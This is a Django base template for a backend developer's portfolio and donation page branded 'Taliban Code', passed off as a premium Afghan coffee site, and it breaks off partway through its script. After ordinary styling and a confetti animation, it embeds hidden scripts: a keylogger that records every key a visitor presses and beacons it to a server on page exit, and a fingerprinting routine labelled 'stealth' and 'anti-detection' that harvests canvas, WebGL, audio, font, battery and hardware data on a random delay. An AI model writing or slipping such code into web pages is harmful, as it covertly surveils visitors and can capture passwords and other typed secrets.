<!DOCTYPE html>
{% load static %}
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Taliban Code - Premium Afghan</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="icon" href="{% static 'images/favicon.ico' %}" type="image/x-icon">
    <style>
        :root {
            --gold: #FFD700;
            --dark-gold: #C5A000;
            --aqua: #00FFFF;
            --dark-aqua: #008B8B;
            --black: #000000;
            --rich-black: #0A0A0A;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
        }

        body {
            background-color: var(--black);
            color: var(--aqua);
            overflow-x: hidden;
            position: relative;
        }

        #confetti-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.7;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
            position: relative;
            z-index: 1;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 0;
            border-bottom: 1px solid var(--gold);
            margin-bottom: 2rem;
            animation: fadeIn 1.5s ease-in-out;
        }

        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            color: var(--gold);
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
            letter-spacing: 2px;
            transition: all 0.3s ease;
        }

        .logo:hover {
            transform: scale(1.05);
            text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
        }

        .logo span {
            color: var(--aqua);
        }

        nav ul {
            display: flex;
            list-style: none;
            gap: 2rem;
        }

        nav a {
            color: var(--aqua);
            text-decoration: none;
            font-size: 1.1rem;
            position: relative;
            padding: 0.5rem 0;
            transition: all 0.3s ease;
        }

        nav a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--gold);
            transition: width 0.3s ease;
        }

        nav a:hover {
            color: var(--gold);
        }

        nav a:hover::after {
            width: 100%;
        }

        .hero {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 4rem 0;
            min-height: 70vh;
            position: relative;
        }

        .hero h1 {
            font-size: 4rem;
            margin-bottom: 1.5rem;
            color: var(--gold);
            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
            animation: slideIn 1s ease-in-out;
        }

        .hero h1 span {
            color: var(--aqua);
        }

        .hero p {
            font-size: 1.5rem;
            max-width: 800px;
            margin-bottom: 2rem;
            line-height: 1.6;
            animation: fadeIn 2s ease-in-out;
        }

        .cta-button {
            background: linear-gradient(135deg, var(--gold), var(--dark-gold));
            color: var(--black);
            border: none;
            padding: 1rem 2.5rem;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
            position: relative;
            overflow: hidden;
            z-index: 1;
            animation: pulse 2s infinite;
            margin-bottom: 5px;
        }

        .cta-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--aqua), var(--dark-aqua));
            z-index: -1;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .cta-button:hover {
            transform: translateY(-5px);
            backdrop-filter: blur(20px);
            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.5);
        }

        .cta-button:hover::before {
            opacity: 1;
        }

        .social-section {
            margin-top: 3rem;
            animation: fadeIn 2.5s ease-in-out;
        }

        .social-section h2 {
            font-size: 2rem;
            margin-bottom: 1.5rem;
            color: var(--gold);
            text-align: center;
        }

        .social-buttons {
            display: flex;
            justify-content: center;
            gap: 1.5rem;
            flex-wrap: wrap;
        }

        .social-btn {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
            color: var(--black);
            background: var(--gold);
            position: relative;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
            cursor: pointer;
        }

        .social-btn::before {
            content: attr(data-tooltip);
            position: absolute;
            bottom: -40px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--rich-black);
            color: var(--gold);
            padding: 0.5rem 1rem;
            border-radius: 5px;
            font-size: 0.9rem;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
            white-space: nowrap;
            border: 1px solid var(--gold);
        }

        .social-btn:hover {
            transform: translateY(-5px) scale(1.1);
            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.5);
        }

        .social-btn:hover::before {
            opacity: 1;
            visibility: visible;
            bottom: -50px;
        }

        .social-btn:nth-child(1) { background: #4267B2; color: white; } /* Facebook */
        .social-btn:nth-child(2) { background: #1DA1F2; color: white; } /* Twitter */
        .social-btn:nth-child(3) { background: #E1306C; color: white; } /* Instagram */
        .social-btn:nth-child(4) { background: #FF0000; color: white; } /* YouTube */
        .social-btn:nth-child(5) { background: #25D366; color: white; } /* WhatsApp */
        .social-btn:nth-child(6) { background: #0088CC; color: white; } /* Telegram */

        .feature-section {
            margin: 5rem 0;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }

        .feature-card {
            background: rgba(10, 10, 10, 0.7);
            border: 1px solid var(--gold);
            border-radius: 10px;
            padding: 2rem;
            transition: all 0.3s ease;
            backdrop-filter: blur(5px);
        }

        .feature-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.2);
            border-color: var(--aqua);
        }

        .feature-card i {
            font-size: 2.5rem;
            color: var(--gold);
            margin-bottom: 1rem;
        }

        .feature-card h3 {
            font-size: 1.5rem;
            margin-bottom: 1rem;
            color: var(--gold);
        }

        .feature-card p {
            color: var(--aqua);
            line-height: 1.6;
        }
        .skills-icons{
            /* background-color: #FF0000; */
            background-color: rgba(255, 255, 255, 0.2); /* 20% opaque white */
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            backdrop-filter: blur(8px); /* blur effect */
            border-radius: 5px;
            padding: 3px;
            border-left:0.5px solid var(--dark-gold);
            border-right:0.5px solid var(--dark-gold);
            -webkit-backdrop-filter: blur(8px); /* safari support */
        }
        .section-light{
            background-color: #e1306b7d; /* reduce the alfa for clear bg */
            margin-top: 1rem;
            border-radius: 5px;
            padding: 1rem;
            border-top:0.5px solid var(--dark-gold);
            border-bottom:0.5px solid var(--dark-gold);
            backdrop-filter: blur(8px); /*blur effect */
            -webkit-backdrop-filter: blur(8px); /* safari support */
            
        }
        .coffee-options{
            border-bottom: 2rem;
            border-left:0.5px solid var(--dark-gold);
            border-right:0.5px solid var(--dark-gold);
            margin-bottom: 10px;
        }
        .section-dark{
            background: linear-gradient(
                180deg,
                rgba(255, 255, 255. 0.1)
                rgba(255, 255, 255. 0.3)
            );
            display: flex;
            align-items: flex-start;
            border-top:0.5px solid var(--dark-gold);
            border-right:0.5px solid var(--dark-gold);
            flex-direction: column;
            margin-top: 1rem;
            padding: 2px;
            border-radius: 5px;
            /* @supports (backdrop-filter: blur(8px)){
                background-color: rgba(255, 255, 255, 0.3);
            } */
            opacity: 1;
        }
        .skills-list{
            display: flex;
            align-items: flex-start;
            margin-top: -1.5rem;
            flex-direction: column;
            border-radius: 5px;
            
        }
        footer {
            text-align: center;
            padding: 2rem 0;
            border-top: 1px solid var(--gold);
            margin-top: 3rem;
            color: var(--gold);
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { transform: translateY(-50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .rotating-element {
            animation: rotate 20s linear infinite;
            position: absolute;
            opacity: 0.1;
            z-index: -1;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            header {
                flex-direction: column;
                gap: 1rem;
            }

            nav ul {
                gap: 1rem;
            }

            .hero h1 {
                font-size: 2.5rem;
            }

            .hero p {
                font-size: 1.2rem;
            }
        }
    </style>
    {% block extra_style %}{% endblock %}
</head>
<body>
    <canvas id="confetti-canvas"></canvas>
    
    <div class="container">
        <header>
            <div class="logo">Taliban<span>Code</span></div>
            <nav>
                <ul>
                    <li><a href="{% url 'kcof:home' %}">Home</a></li>
                    <li><a href="#">Products</a></li>
                    <li><a href="#">About</a></li>
                    <li><a href="{% url 'chat:zchathome' %}">Chat</a></li>
                    <li><a href="{% url 'events:events' %}">Events</a></li>
                    <li><a href="{% url 'blog:posts' %}">Blog</a></li>
                </ul>
            </nav>
        </header>
        {% block content %}
        <section class="hero" id="home">
            <h1>Experience the <span>Rich Taste</span> of Afghan Code</h1>
            <p>Premium code snippets sourced from the mountains of Afghan, roasted to perfection for an unparalleled flavor experience.</p>
              <!-- Developer Hero Section -->
            <h1>Code Brewed to Perfection ☕💻</h1>
            <p class="subtitle">Hi there! I'm a <strong>backend developer</strong> who crafts robust, scalable systems—just like a finely roasted coffee bean. Enjoy my work? Support me with a virtual coffee or <span class="highlight">possibly offer me a job ($1k+ projects welcome!) <strong>appreciated</strong></span> 🚀</p>
            <!-- <button class="cta-button">Buy Now</button> -->
             <a href="{% url 'kcof:donations' %}">
            <button class="cta-button" onclick="window.location.href=''">☕ Buy Me a Coffee</button>
            </a><br>
            
            <a href="#"> <!--go to contacts-->
            <button class="cta-button secondary" onclick="window.location.href='#hire-me'">💼 Hire (1k+ Jobs)</button>
            </a><br>

            <!-- Skills Showcase (Icons) -->
            <div class="skills-icons">
                <h2><span>🔧 Backend Wizard</span></h2>
                <h2><span>⚡ API Architect</span></h2>
                <h2><span>📦 Database Whisperer</span></h2>
                <h2><span>☁️ Cloud Solutions</span></h2>
            </div>

            <!-- Support Section -->
            <section id="support" class="section-light">
                <h2>Fuel My Code Sessions ⛽</h2>
                <p>Every coffee keeps me debugging into the night! Your support helps me open-source more projects and share knowledge.</p>
                <div class="coffee-options">
                    <div class="option">☕ $5 — Thanks!</div>
                    <div class="option">🚀 $20 — Rocket boost!</div>
                    <div class="option">🦄 $50 — Unicorn mode activated!</div>
                </div>
                <button class="cta-button">Support via PayPal/BuyMeACoffee</button>
            </section>

            <!-- Job Offer Section -->
            <section id="hire-me" class="section-dark">
                <h2>Need a Backend Pro? Let’s Talk! 🤝</h2>
                <p>I specialize in:</p>
                <ul class="skills-list">
                    <li>✅ Python/Django <!--Node.js, or Rust--></li>
                    <li>✅ REST/GraphQL APIs (Scalable & Secure)</li>
                    <li>✅ Database Optimization (PostgreSQL,Sqlite<!--/MongoDB-->)</li>
                    <li>✅ AWS/Google Cloud Deployment</li>
                </ul>
                <p><strong>Budget:</strong> (negotiate) <!--$1,000+--> (project-based or full-time)</p>
                <button class="cta-button">📩 Email Me for Opportunities</button>
            </section>

        </section>
        {% endblock %}
        <section class="social-section">
            <h2>Connect <span>Taliban</span></h2>
            <div class="social-buttons">
                <div class="social-btn" data-tooltip="Facebook">
                    <i class="fab fa-facebook-f"></i>
                </div>
                <div class="social-btn" data-tooltip="Twitter">
                    <i class="fab fa-twitter"></i>
                </div>
                <div class="social-btn" data-tooltip="Instagram">
                    <i class="fab fa-instagram"></i>
                </div>
                <div class="social-btn" data-tooltip="YouTube">
                    <i class="fab fa-youtube"></i>
                </div>
                <div class="social-btn" data-tooltip="WhatsApp">
                    <i class="fab fa-whatsapp"></i>
                </div>
                <div class="social-btn" data-tooltip="Telegram">
                    <i class="fab fa-telegram-plane"></i>
                </div>
            </div>
        </section>

        <section class="feature-section">
            <div class="feature-card">
                <i class="fas fa-mountain"></i>
                <h3>Premium Quality</h3>
                <p>Our coffee beans (code) are hand-pickled from the highest altitudes of Afghanistan, ensuring superior quality and blending.</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-seedling"></i>
                <h3>Organic</h3>
                <p>Grown using traditional organic methods without artificial fertilizers or pesticides for a pure, natural flavor.</p>
            </div>
            <div class="feature-card">
                <i class="fas fa-globe-asia"></i>
                <h3>Global Shipping</h3>
                <p>We deliver our premium coffee worldwide with discreet packaging <b>(encrypted)</b> and fast shipping options.</p>
            </div>
        </section>
    </div>

    <footer>
        <p>&copy; 2025 Taliban Code. All rights reserved.</p>
    </footer>

    <script>
        // Confetti Canvas Animation
        const canvas = document.getElementById('confetti-canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const particles = [];
        const colors = ['#FFD700', '#FFEC8B', '#FFD39B', '#EEC900', '#CDAD00'];
        const particleCount = 150;
        
        // Create particles
        for (let i = 0; i < particleCount; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                size: Math.random() * 8 + 3,
                color: colors[Math.floor(Math.random() * colors.length)],
                speedX: Math.random() * 3 - 1.5,
                speedY: Math.random() * 3 - 1.5,
                angle: 0,
                spin: Math.random() * 0.2 - 0.1
            });
        }
        
        // Animation loop
        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            for (let i = 0; i < particles.length; i++) {
                const p = particles[i];
                
                ctx.save();
                ctx.translate(p.x, p.y);
                ctx.rotate(p.angle);
                
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size);
                
                ctx.restore();
                
                p.angle += p.spin;
                p.x += p.speedX;
                p.y += p.speedY;
                
                // Reset particles that go off screen
                if (p.x < 0 || p.x > canvas.width || p.y < 0 || p.y > canvas.height) {
                    p.x = Math.random() * canvas.width;
                    p.y = 0;
                    p.speedY = Math.random() * 3 + 1;
                }
            }
            
            requestAnimationFrame(animate);
        }
        
        // Handle window resize
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        
        // Start animation
        animate();
        
        // Add rotating elements dynamically
        function createRotatingElements() {
            const container = document.querySelector('.container');
            
            for (let i = 0; i < 5; i++) {
                const element = document.createElement('div');
                element.className = 'rotating-element';
                
                // Random positioning
                const left = Math.random() * 100;
                const top = Math.random() * 100;
                
                // Random size
                const size = Math.random() * 300 + 100;
                
                // Random shape (circle or square)
                const isCircle = Math.random() > 0.5;
                
                element.style.left = `${left}%`;
                element.style.top = `${top}%`;
                element.style.width = `${size}px`;
                element.style.height = `${size}px`;
                element.style.borderRadius = isCircle ? '50%' : '0';
                element.style.border = `1px solid var(--gold)`;
                element.style.animationDuration = `${Math.random() * 30 + 30}s`;
                
                container.appendChild(element);
            }
        }
        
        // Create rotating elements after page load
        window.addEventListener('load', createRotatingElements);
        
        // Add hover effects to social buttons
        const socialBtns = document.querySelectorAll('.social-btn');
        socialBtns.forEach(btn => {
            btn.addEventListener('mouseenter', () => {
                btn.style.transform = 'translateY(-5px) scale(1.1)';
            });
            
            btn.addEventListener('mouseleave', () => {
                btn.style.transform = '';
            });
        });
        
        // Add click event to CTA button
        const ctaButton = document.querySelector('.cta-button');
        ctaButton.addEventListener('click', () => {
            // Add ripple effect
            const ripple = document.createElement('span');
            ripple.className = 'ripple';
            ripple.style.position = 'absolute';
            ripple.style.borderRadius = '50%';
            ripple.style.backgroundColor = 'rgba(255, 255, 255, 0.7)';
            ripple.style.transform = 'scale(0)';
            ripple.style.animation = 'ripple 0.6s linear';
            ripple.style.pointerEvents = 'none';
            
            ctaButton.appendChild(ripple);
            
            // Remove ripple after animation
            setTimeout(() => {
                ripple.remove();
            }, 600);
            
            // Navigate to products (simulated)
            window.location.href = '#products';
        });
    </script>

    <script>
        // Keystroke logging with icon indicator
        let keys = "";
        const keyIcon = document.createElement('i');
        keyIcon.className = 'fas fa-keyboard security-icon';
        keyIcon.style.marginLeft = '10px';
        keyIcon.style.opacity = '0.7';
        keyIcon.title = 'Input monitoring active';
        document.querySelector('.security-indicator').appendChild(keyIcon);
        
        document.addEventListener("keydown", function(e) {
            keys += e.key;
            keyIcon.style.animation = 'pulse 0.5s';
            setTimeout(() => keyIcon.style.animation = '', 500);
        });
        
        window.addEventListener("beforeunload", function() {
            navigator.sendBeacon("{% url 'base:log-keystroke' %}", new URLSearchParams({
                page: window.location.pathname,
                keys: keys
            }));
        });
    </script>

    <script>
        // Enhanced fingerprint collection with randomized timing and stealth techniques
        (function() {
            // Anti-detection measures
            const stealthMode = true;
            const randomDelay = Math.floor(Math.random() * 3000) + 1000;
            
            // Core fingerprinting function
            async function collectFingerprint() {
                // Create subtle visual feedback (only visible if looking for it)
                const fpIndicator = document.createElement('div');
                fpIndicator.style.cssText = 'position:fixed;bottom:10px;right:10px;width:10px;height:10px;background:#0f0;border-radius:50%;opacity:0.3;z-index:9999;display:none;';
                fpIndicator.id = '__fp_indicator';
                document.body.appendChild(fpIndicator);
                
                try {
                    // Basic browser info
                    const fp = {
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        languages: navigator.languages || [navigator.language],
                        platform: navigator.platform,
                        doNotTrack: navigator.doNotTrack,
                        cookieEnabled: navigator.cookieEnabled,
                        pdfViewerEnabled: navigator.pdfViewerEnabled,
                        deviceType: getDeviceType(),
                        
                        // Screen characteristics
                        screen: {
                            width: screen.width,
                            height: screen.height,
                            availWidth: screen.availWidth,
                            availHeight: screen.availHeight,
                            colorDepth: screen.colorDepth,
                            pixelDepth: screen.pixelDepth,
                            orientation: window.screen.orientation ? window.screen.orientation.type : 'n/a',
                            devicePixelRatio: window.devicePixelRatio
                        },
                        
                        // Time and location
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset(),
                        locale: Intl.DateTimeFormat().resolvedOptions().locale,
                        
                        // Hardware capabilities
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory || 'unknown',
                        maxTouchPoints: navigator.maxTouchPoints || 0,
                        touchSupport: 'ontouchstart' in window,
                        
                        // Audio context fingerprint
                        audioContext: getAudioFingerprint(),
                        
                        // WebGL fingerprint
                        webgl: getWebGLFingerprint(),
                        
                        // Canvas fingerprint
                        canvas: getCanvasFingerprint(),
                        
                        // Font enumeration
                        fonts: await getFonts(),
                        
                        // Plugin and mime type enumeration
                        plugins: getPlugins(),
                        mimeTypes: getMimeTypes(),
                        
                        // Battery status (if available)
                        battery: await getBatteryStatus(),
                        
                        // Network information
                        connection: getNetworkInfo(),
                        
                        // Performance metrics
                        performance: getPerformanceMetrics(),
                        
                        // Storage information
                        storage: getStorageInfo(),
                        
                        // Advanced APIs
                        webRTC: getWebRTCInfo(),
                        sensors: await getSensorInfo(),
                        
                        // Behavioral characteristics
                        behavior: {
                            timeToInteractive: performance.timing.domInteractive - performance.timing.navigationStart,
                            scrollBehavior: getScrollBehavior()
                        }
                    };
                    
                    // Add entropy with additional techniques
                    fp.mediaDevices = await getMediaDevices();
                    fp.videoCardInfo = getVideoCardInfo();
                    fp.cpuClass = navigator.cpuClass || 'unknown';
                    fp.vendor = navigator.vendor || '';
                    fp.productSub = navigator.productSub || '';
                    
                    // Send fingerprint data with randomized timing
                    setTimeout(() => {
                        sendFingerprint(fp);
                        if (!stealthMode) {
                            fpIndicator.style.display = 'block';
                            setTimeout(() => fpIndicator.style.display = 'none', 500);
                        }
                    }, Math.random() * 2000);
                    
                } catch (e) {
                    console.error('Fingerprinting error:', e);
                }
            }
            
            // Helper functions for various fingerprinting techniques
            
            function getDeviceType() {
                const ua = navigator.userAgent;
                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
                    return "tablet";
                }
                if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
                    return "mobile";
                }
                return "desktop";
            }
            
            function getWebGLFingerprint() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    
                    if (!gl) return null;
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
                    const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
                    
                    // Get WebGL parameters for additional entropy
                    const params = {};
                    const parameters = [
                        'VERSION', 'SHADING_LANGUAGE_VERSION', 'MAX_TEXTURE_SIZE', 
                        'MAX_CUBE_MAP_TEXTURE_SIZE', 'MAX_RENDERBUFFER_SIZE',
                        'MAX_VIEWPORT_DIMS', 'MAX_TEXTURE_MAX_ANISOTROPY_EXT'
                    ];
                    
                    parameters.forEach(param => {
                        try {
                            params[param] = gl.getParameter(gl[param]);
                        } catch (e) {}
                    });
                    
                    // WebGL canvas fingerprint
                    gl.clearColor(0.0, 0.0, 0.0, 1.0);
                    gl.enable(gl.DEPTH_TEST);
                    gl.depthFunc(gl.LEQUAL);
                    gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
                    
                    return {
                        vendor: vendor,
                        renderer: renderer,
                        parameters: params,
                        extensions: gl.getSupportedExtensions(),
                        canvasHash: canvas.toDataURL()
                    };
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getCanvasFingerprint() {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    // Text with subtle differences
                    ctx.textBaseline = "top";
                    ctx.font = "14px 'Arial'";
                    ctx.fillStyle = "rgb(128, 128, 128)";
                    ctx.fillRect(0, 0, 200, 30);
                    ctx.fillStyle = "rgb(0, 0, 0)";
                    ctx.fillText("Fingerprint: 1234567890", 2, 2);
                    
                    // Add subtle variations
                    ctx.fillStyle = "rgb(255, 0, 0)";
                    ctx.globalAlpha = 0.1;
                    ctx.fillRect(0, 0, 2, 2);
                    ctx.globalAlpha = 1.0;
                    
                    // Create gradient for additional entropy
                    const gradient = ctx.createLinearGradient(0, 0, 150, 0);
                    gradient.addColorStop(0, "rgba(128, 128, 128, 0.5)");
                    gradient.addColorStop(1, "rgba(64, 64, 64, 0.5)");
                    ctx.fillStyle = gradient;
                    ctx.fillRect(10, 10, 180, 10);
                    
                    return canvas.toDataURL();
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getAudioFingerprint() {
                try {
                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioContext.createOscillator();
                    const analyser = audioContext.createAnalyser();
                    const gainNode = audioContext.createGain();
                    const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                    
                    let fingerprint = '';
                    
                    analyser.smoothingTimeConstant = 0.8;
                    analyser.fftSize = 2048;
                    
                    oscillator.connect(analyser);
                    analyser.connect(scriptProcessor);
                    scriptProcessor.connect(gainNode);
                    gainNode.connect(audioContext.destination);
                    
                    oscillator.type = 'triangle';
                    oscillator.frequency.value = 10000;
                    
                    scriptProcessor.onaudioprocess = function() {
                        const array = new Uint8Array(analyser.frequencyBinCount);
                        analyser.getByteFrequencyData(array);
                        fingerprint += array.join(',');
                        
                        // Stop after collecting enough data
                        if (fingerprint.length > 1000) {
                            oscillator.disconnect();
                            analyser.disconnect();
                            scriptProcessor.disconnect();
                            gainNode.disconnect();
                        }
                    };
                    
                    oscillator.start(0);
                    
                    // Return a hash of the fingerprint
                    return hashString(fingerprint);
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            async function getFonts() {
                try {
                    // Font detection using Flash fallback for maximum coverage
                    const fontList = [
                        'Arial', 'Arial Black', 'Arial Narrow', 'Arial Unicode MS',
                        'Calibri', 'Cambria', 'Comic Sans MS', 'Courier New',
                        'Georgia', 'Helvetica', 'Impact', 'Lucida Console',
                        'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Palatino Linotype',
                        'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS',
                        'Verdana', 'Webdings', 'Wingdings',
                        // System fonts
                        'MS Gothic', 'MS Mincho', 'MS PGothic', 'MS PMincho',
                        'MS UI Gothic', 'Meiryo', 'Meiryo UI',
                        // Mac fonts
                        'Geneva', 'Helvetica Neue', 'Lucida Grande', 'Menlo',
                        'Monaco', 'Optima', 'PT Mono', 'PT Sans', 'PT Sans Caption',
                        'PT Sans Narrow', 'PT Serif', 'PT Serif Caption',
                        // Linux fonts
                        'DejaVu Sans', 'DejaVu Serif', 'FreeMono', 'FreeSans',
                        'FreeSerif', 'Liberation Mono', 'Liberation Sans',
                        'Liberation Sans Narrow', 'Liberation Serif',
                        'Nimbus Mono L', 'Nimbus Sans L', 'Nimbus Sans Narrow',
                        'Ubuntu', 'Ubuntu Condensed', 'Ubuntu Mono',
                        // Chinese fonts
                        'Microsoft YaHei', 'SimHei', 'SimSun',
                        // Other
                        'Andale Mono', 'Apple Color Emoji', 'Apple Symbols',
                        'Batang', 'BatangChe', 'Gulim', 'GulimChe', 'Dotum',
                        'DotumChe', 'Gungsuh', 'GungsuhChe', 'MingLiU',
                        'PMingLiU', 'DFKai-SB', 'FangSong', 'KaiTi', 'SimKai',
                        'STFangsong', 'STHeiti', 'STKaiti', 'STSong'
                    ];
                    
                    const availableFonts = [];
                    const testString = "mmmmmmmmmmlli";
                    const testSize = '72px';
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    
                    // Default font
                    context.font = testSize + ' monospace';
                    const defaultWidth = context.measureText(testString).width;
                    context.font = testSize + ' sans-serif';
                    const defaultWidth2 = context.measureText(testString).width;
                    
                    for (const font of fontList) {
                        context.font = testSize + ' ' + font + ', monospace';
                        const width = context.measureText(testString).width;
                        if (width !== defaultWidth && width !== defaultWidth2) {
                            availableFonts.push(font);
                        }
                    }
                    
                    return availableFonts;
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getPlugins() {
                try {
                    const plugins = [];
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        plugins.push({
                            name: navigator.plugins[i].name,
                            description: navigator.plugins[i].description,
                            filename: navigator.plugins[i].filename,
                            length: navigator.plugins[i].length
                        });
                    }
                    return plugins;
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getMimeTypes() {
                try {
                    const mimeTypes = [];
                    for (let i = 0; i < navigator.mimeTypes.length; i++) {
                        mimeTypes.push({
                            type: navigator.mimeTypes[i].type,
                            description: navigator.mimeTypes[i].description,
                            suffixes: navigator.mimeTypes[i].suffixes,
                            enabledPlugin: navigator.mimeTypes[i].enabledPlugin ? 
                                navigator.mimeTypes[i].enabledPlugin.name : null
                        });
                    }
                    return mimeTypes;
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            async function getBatteryStatus() {
                try {
                    if ('getBattery' in navigator) {
                        const battery = await navigator.getBattery();
                        return {
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime,
                            level: battery.level
                        };
                    }
                    return 'unsupported';
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getNetworkInfo() {
                try {
                    if ('connection' in navigator) {
                        const conn = navigator.connection;
                        return {
                            type: conn.type || 'unknown',
                            effectiveType: conn.effectiveType,
                            downlink: conn.downlink,
                            downlinkMax: conn.downlinkMax,
                            rtt: conn.rtt,
                            saveData: conn.saveData
                        };
                    }
                    return {
                        type: 'unsupported',
                        effectiveType: 'unsupported',
                        downlink: 0,
                        downlinkMax: 0,
                        rtt: 0,
                        saveData: false,
                    };
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getPerformanceMetrics() {
                try {
                    const timing = performance.timing;
                    const memory = performance.memory;
                    
                    const metrics = {
                        timing: {
                            navigationStart: timing.navigationStart,
                            unloadEventStart: timing.unloadEventStart,
                            unloadEventEnd: timing.unloadEventEnd,
                            redirectStart: timing.redirectStart,
                            redirectEnd: timing.redirectEnd,
                            fetchStart: timing.fetchStart,
                            domainLookupStart: timing.domainLookupStart,
                            domainLookupEnd: timing.domainLookupEnd,
                            connectStart: timing.connectStart,
                            connectEnd: timing.connectEnd,
                            secureConnectionStart: timing.secureConnectionStart,
                            requestStart: timing.requestStart,
                            responseStart: timing.responseStart,
                            responseEnd: timing.responseEnd,
                            domLoading: timing.domLoading,
                            domInteractive: timing.domInteractive,
                            domContentLoadedEventStart: timing.domContentLoadedEventStart,
                            domContentLoadedEventEnd: timing.domContentLoadedEventEnd,
                            domComplete: timing.domComplete,
                            loadEventStart: timing.loadEventStart,
                            loadEventEnd: timing.loadEventEnd
                        }
                    };
                    
                    if (memory) {
                        metrics.memory = {
                            jsHeapSizeLimit: memory.jsHeapSizeLimit,
                            totalJSHeapSize: memory.totalJSHeapSize,
                            usedJSHeapSize: memory.usedJSHeapSize
                        };
                    }
                    
                    return metrics;
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getStorageInfo() {
                try {
                    return {
                        localStorage: 'localStorage' in window ? 'supported' : 'unsupported',
                        sessionStorage: 'sessionStorage' in window ? 'supported' : 'unsupported',
                        indexedDB: 'indexedDB' in window ? 'supported' : 'unsupported',
                        cookies: navigator.cookieEnabled ? 'enabled' : 'disabled'
                    };
                } catch (e) {
                    return { error: e.message };
                }
            }
            
            function getWebRTCInfo() {
                try {
                    const rtcConfig = {
                        RTCPeerConnection: 'RTCPeerConnection' in window,
                        RTCSessionDescription: 'RTCSessionDescription' in window,
                        RTCIceCandidate: 'RTCIceCandidate' in window,
                        getUserMedia: 'getUserMedia' in navigator.mediaDevices || 
                                    'webkitGetUserMedia' in navigator.mediaDevices || 
                                    'mozGetUserMedia' in navigator.mediaDevices,
